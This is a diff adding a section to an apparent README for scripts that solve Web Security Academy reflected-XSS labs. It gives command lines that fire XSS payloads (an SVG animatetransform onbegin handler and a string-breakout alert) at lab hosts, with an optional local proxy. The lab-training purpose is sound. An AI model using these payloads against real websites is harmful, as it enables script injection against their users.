@@ -51,3 +51,11 @@ No proxy:
 
 Proxy:
 - `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "\';alert(1)//" -p 127.0.0.1:8080`
+
+### 6. Reflected XSS with some SVG markup allowed
+
+No proxy:
+- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "<svg><animatetransform onbegin=alert('XSS') attributeName=transform>"`
+
+Proxy:
+- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "<svg><animatetransform onbegin=alert('XSS') attributeName=transform>" -p 127.0.0.1:8080`
